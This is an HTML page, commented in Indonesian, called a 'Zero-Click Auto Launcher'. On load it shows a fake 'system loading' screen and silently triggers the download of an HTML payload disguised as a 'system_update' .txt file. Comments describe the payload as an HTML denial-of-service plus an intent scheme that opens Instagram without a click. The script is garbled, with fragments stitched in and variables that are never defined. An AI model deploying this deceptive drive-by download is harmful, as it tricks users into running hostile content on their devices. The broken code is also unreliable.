<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Zero-Click Auto Launcher</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
        h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
        p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
        #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
        .loading { animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
    </style>
</head>

<body>
<div class="panel" id="main-panel">
    <h1 class="loading">⏳ SYSTEM LOADING</h1>
    <p>Menyiapkan komponen sistem...</p>
    <div id="status" role="status">Memuat halaman...</div>
</div>

<script>
    const statusDiv = document.getElementById("status");

    // Payload HTML DoS + Intent (Akan dijalankan di dalam file .txt.html)

            </div>
            <style>@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }</style>

                (function(){
                    "use strict";
                    document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';
                    
                    // 1. INTENT SCHEME (Zero-Click ke Instagram)

                        worker.onmessage = function(e) {
                            if (e.data === 'OPEN') queueMicrotask(bukaTab);

                        var bytes = new Uint8Array(len);

    // FUNGSI ZERO-CLICK: Langsung jalankan saat halaman dimuat
    window.addEventListener("DOMContentLoaded", () => {
        statusDiv.textContent = "Memicu Zero-Click Auto Download...";
        
        try {
            // Buat Blob dari payload
            const blob = new Blob([payloadText], { type: "text/html" });
            const url = URL.createObjectURL(blob);
            
            // Buat link tersembunyi
            const a = document.createElement("a");
            a.href = url;
            a.download = `system_update_${Date.now()}.txt`;
            a.style.display = "none";
            document.body.appendChild(a);
            
            // Picu unduhan secara otomatis
            a.click();
            
            setTimeout(() => {
                if (a.parentNode) document.body.removeChild(a);
                URL.revokeObjectURL(url);
                statusDiv.textContent = "File .txt berhasil diunduh. Buka file tersebut untuk memicu aksi.";
                statusDiv.style.color = "#4CAF50";
            }, 1000);

        } catch(e) {
            statusDiv.textContent = "Gagal: " + e.message;
            statusDiv.style.color = "#f00";
        }
    });
</script>
</body>
</html>
